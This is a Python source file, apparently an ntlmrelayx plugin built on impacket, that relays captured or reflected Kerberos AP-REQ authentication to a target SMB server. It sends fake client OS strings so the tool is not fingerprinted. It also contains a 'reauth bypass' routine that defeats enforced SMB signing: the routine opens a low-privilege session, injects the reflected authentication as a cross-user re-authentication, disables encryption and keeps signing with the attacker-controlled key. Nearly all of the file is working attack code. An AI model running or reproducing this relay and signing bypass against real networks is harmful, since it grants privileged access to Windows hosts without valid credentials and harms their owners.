# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Protocol Client
#
# Author:
#  Alberto Solino (@agsolino)
#  Hugo VINCENT (@hugow_vincent)
#
# Description:
#  This is the SMB client which initiates the connection to an
# SMB server and relays the credentials to this server.

from socket import error as socketerror
from impacket import LOG
from lib.clients import ProtocolClient
from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
from impacket.nt_errors import STATUS_SUCCESS
from impacket.smb import SMB, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters
from impacket.smb3 import SMB3, SMB2_NEGOTIATE_SIGNING_ENABLED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP
from impacket.smbconnection import SMBConnection, SessionError
from binascii import a2b_hex
from impacket.krb5.kerberosv5 import KerberosError
from impacket import smb, smb3

PROTOCOL_CLIENT_CLASS = "SMBRelayClient"

class MYSMB(SMB):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
        self.extendedSecurity = extendedSecurity
        SMB.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negPacket=negPacket)

    def kerberos_apreq_login(self, authdata_gssapi):

        flags1, flags2 = self.get_flags()
        if flags2 & SMB.FLAGS2_UNICODE:
            self.set_flags(flags2=(flags2 & (flags2 ^ SMB.FLAGS2_UNICODE)))

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 61440
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE | SMB.CAP_LARGE_READX | SMB.CAP_LARGE_WRITEX

        sessionSetup['Parameters']['SecurityBlobLength']  = len(authdata_gssapi)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = authdata_gssapi

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        self.sendSMB(smb)

        smb = self.recvSMB()
        if smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX):
            # We will need to use this uid field for all future requests/responses
            self._uid = smb['Uid']

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])

            self._action = sessionParameters['Action']

            # restore unicode flag if needed
            if flags2 & SMB.FLAGS2_UNICODE:
                self.__flags2 |= SMB.FLAGS2_UNICODE

            return 1
        else:
            raise Exception('Error: Could not login successfully')

class MYSMB3(SMB3):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
        self.extendedSecurity = extendedSecurity
        SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket))

    def kerberos_apreq_login(self, authdata_gssapi):
        sessionSetup = SMB2SessionSetup()

        sessionSetup['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED

        sessionSetup['Flags'] = 0

        sessionSetup['SecurityBufferLength'] = len(authdata_gssapi)
        sessionSetup['Buffer']               = authdata_gssapi

        packet = self.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data']    = sessionSetup

        #Initiate session preauth hash
        self._Session['PreauthIntegrityHashValue'] = self._Connection['PreauthIntegrityHashValue']

        packetID = self.sendSMB(packet)
        ans = self.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_SUCCESS):           
            self._Session['SessionID']       = ans['SessionID']
            self._Session['SigningRequired'] = False
            self._Session['Connection']      = self._NetBIOSSession.get_socket()
            self._Session['SigningKey']        = ''
            self._Session['SessionKey']        = ''
            self._Session['SigningActivated']  = False
            self._Session['CalculatePreAuthHash'] = False
            return True
        else:
            # We clean the stuff we used in case we want to authenticate again
            # within the same connection
            self._Session['UserCredentials']   = ''
            self._Session['Connection']        = 0
            self._Session['SessionID']         = 0
            self._Session['SigningRequired']   = False
            self._Session['SigningKey']        = ''
            self._Session['SessionKey']        = ''
            self._Session['SigningActivated']  = False
            self._Session['CalculatePreAuthHash'] = False
            self._Session['PreauthIntegrityHashValue'] = a2b_hex(b'0'*128)
            raise Exception('Unsuccessful Login')

class SMBRelayClient(ProtocolClient):
    PLUGIN_NAME = "SMB"
    def __init__(self, serverConfig, target, targetPort = 445, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity

        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None
        self.sessionData = {}

        self.keepAliveHits = 1

    def keepAlive(self):
        # SMB Keep Alive more or less every 5 minutes
        if self.keepAliveHits >= (250 / KEEP_ALIVE_TIMER):
            # Time to send a packet
            # Just a tree connect / disconnect to avoid the session timeout
            tid = self.session.connectTree('IPC$')
            self.session.disconnectTree(tid)
            self.keepAliveHits = 1
        else:
            self.keepAliveHits +=1

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def _reauth_bypass(self, smbClient, authdata):
        """reauthx: defeat enforced SMB signing without any privileged credential.

        Open a base SMB session as a low-priv account (whose signing key we therefore control),
        then inject the reflected AP-REQ as a cross-user RE-AUTHENTICATION on that same session.
        The server does not re-derive the signing key on re-auth, so the now-privileged session
        keeps signing under our low-priv key -> enforced signing is defeated.
        Ceiling: the Sep-2026 same-user re-auth check (rejects the swap with ACCESS_DENIED).
        """
        from impacket.smb3structs import (SMB2SessionSetup, SMB2_SESSION_SETUP,
                                          SMB2_SESSION_FLAG_ENCRYPT_DATA)
        domain, user, password = self.serverConfig.reauth_creds
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port=self.targetPort,
                                     existingConnection=smbClient, manualNegotiate=True)
        v2 = self.session.getSMBServer()
        v2._Connection['RequireSigning'] = True          # force signing-key derivation at login
        self.session.login(user, password, domain)
        k_sign = v2._Session['SigningKey']
        k_sess = v2._Session['SessionKey']
        LOG.info('[reauth-bypass] base session %s SID=0x%x signingKey=%s'
                 % (user, v2._Session['SessionID'], k_sign.hex()))
        # impacket encrypts by default when supported: force signing-only so the bypass is on-wire
        v2._Session['SessionFlags'] = v2._Session.get('SessionFlags', 0) & ~SMB2_SESSION_FLAG_ENCRYPT_DATA
        v2._Session['EncryptData'] = False
        # inject the reflected AP-REQ as a re-auth on the signed low-priv session
        ss = SMB2SessionSetup()
        ss['Flags'] = 0
        ss['SecurityMode'] = 1
        ss['SecurityBufferLength'] = len(authdata['krbauth'])
        ss['Buffer'] = authdata['krbauth']
        pkt = v2.SMB_PACKET()
        pkt['Command'] = SMB2_SESSION_SETUP
        pkt['Data'] = ss
        status = v2.recvSMB(v2.sendSMB(pkt))['Status']
        LOG.info('[reauth-bypass] reflected re-auth status=0x%08x' % status)
        if status != 0:
            LOG.error('[reauth-bypass] re-auth refused (0x%08x) - target likely patched '
                      '(Sep-2026 same-user re-auth check)' % status)
            return False
        v2._Session['SigningKey'] = k_sign
        v2._Session['SessionKey'] = k_sess
        v2._Session['SigningRequired'] = True
        v2._Session['SigningActivated'] = True
        LOG.info('[reauth-bypass] SUCCESS - privileged session kept, signing with the low-priv key')
        return True

    def initConnection(self, authdata, kdc=None):
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort, manualNegotiate=True)
                                     #,preferredDialect=SMB_DIALECT)
        if self.serverConfig.smb2support is True:
            data = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
        else:
            data = '\x02NT LM 0.12\x00'

        if self.extendedSecurity is True:
            flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        else:
            flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        try:
            packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
                                                  flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
                             flags2=flags2, data=data)
        except socketerror as e:
            if 'reset by peer' in str(e):
                if not self.serverConfig.smb2support:
                    LOG.error('SMBCLient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with -smb2support')
                else:
                    LOG.error('SMBCLient error: Connection was reset')
            else:
                LOG.error('SMBCLient error: %s' % str(e))
            return False
        if packet[0:1] == b'\xfe':
            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
        else:
            # Answer is SMB packet, sticking to SMBv1
            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)

        if getattr(self.serverConfig, 'reauth_bypass', False):
            return self._reauth_bypass(smbClient, authdata)

        try:
            smbClient.kerberos_apreq_login(authdata["krbauth"])
        except (smb.SessionError, smb3.SessionError) as e:
            raise SessionError(e.get_error_code(), e.get_error_packet())
        except KerberosError as e:
            raise e
        
        if smbClient.is_signing_required():
            LOG.error("The Attack won't work, the target server enforce signing.")
            return False

        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                     existingConnection=smbClient, manualNegotiate=True)
        return True